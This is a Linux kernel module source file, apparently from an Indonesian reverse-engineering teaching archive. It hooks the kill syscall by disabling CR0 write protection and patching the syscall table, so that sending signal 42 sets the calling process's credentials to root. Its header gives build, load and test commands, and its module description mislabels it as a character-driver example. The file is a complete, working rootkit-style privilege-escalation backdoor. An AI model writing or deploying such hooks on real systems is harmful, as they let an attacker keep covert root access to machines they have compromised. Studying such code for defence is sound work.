/*
    Give Root
    Archive of Reversing.ID
    Based on Linux Kernel Module Programming Guide

    Tested on Linux Kernel 4.9.0-11-amd64 (Debian)

    Memberikan root access kepada process tertentu.

Build:
    $ make

Module info:
    $ modinfo code.ko

List module:
    $ lsmod

Load:
    $ insmod code.ko

Testing:
    (using non root user without sudo capability)
    $ whoami && id
    $ kill -42 0
    $ whoami && id

Unload:
    $ rmmod code
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Reversing.ID");
MODULE_DESCRIPTION("Example of Char Driver (Linux)");


/*
    Pada Linux, sebuah privilege ditentukan berdasarkan User ID dan Group ID.
    Sebuah resource diperbolehkan untuk diakses (R/W/X) oleh user dan group
    yang sesuai.

    Terdapat beberapa tipe credentials, yaitu:
        uid     = user id
        euid    = effective user id
        suid    = saved user id
        fsuid   = file-system user id
    
    Dengan melakukan overwrite terhadap semua id sebagai 0, maka secara praktis
    user tersebut menjadi user 0 (root).
*/

/* ****************** Type Definition & Data Declaration ****************** */

/* 
    signal yang akan dikirimkan oleh kill menjadi command bagi module.
    gunakan signal yang termasuk ke dalam kategori real-time signal
    dan tidak digunakan dalam library.
*/
enum 
{
    SIGPRIV = 42,   
};

unsigned long cr0;

/* pointer ke syscall table */
static unsigned long *__sys_call_table;

/* pointer ke syscall original */
typedef asmlinkage int (*_o_kill_t  ) (pid_t, int);

_o_kill_t ptr_kill;

/* ********************* Internal Functions Prototype ********************* */

void give_root (void);

/* dapatkan alamat syscall table */
unsigned long * get_syscall_table_addr (void);

asmlinkage int new_kill (pid_t pid, int sig);


/* *************************** Helper Functions *************************** */

static inline void protect_memory(void)
{
    write_cr0(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0(cr0 & ~0x00010000);
}


/* ****************** Loadable Kernel Module Initialize ******************* */

static int __init code_init(void)
{
    /* temukan alamat syscall table */
    __sys_call_table = get_syscall_table_addr ();
    if (! __sys_call_table)
        return -1;

    cr0 = read_cr0 ();

    ptr_kill = (_o_kill_t) __sys_call_table[__NR_kill];

    unprotect_memory();
    __sys_call_table[__NR_kill] = (unsigned long) new_kill;
    protect_memory();

    return 0;
}

static void __exit code_exit(void)
{
    unprotect_memory();
    __sys_call_table[__NR_kill] = (unsigned long) ptr_kill;
    protect_memory();
}

module_init(code_init);
module_exit(code_exit);


/* ******************* Internal Functions Implementation ******************* */

/* 
    Memberikan privilege root kepada sesi saat ini.
*/
void give_root (void)
{
    struct cred * newcred;

    newcred = prepare_creds();
    if (newcred)
    {
        newcred->uid.val    = newcred->gid.val      = 0;
        newcred->euid.val   = newcred->egid.val     = 0;
        newcred->suid.val   = newcred->sgid.val     = 0;
        newcred->fsuid.val  = newcred->fsgid.val    = 0;

        commit_creds(newcred);
    }
}

unsigned long * 
get_syscall_table_addr (void)
{
    unsigned long * result;

    result = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    return result;
}

asmlinkage int 
new_kill (pid_t pid, int sig)
{
    switch (sig)
    {
        case SIGPRIV:
            give_root();
            break;
        default:
            return ptr_kill(pid, sig);
    }

    return 0;
}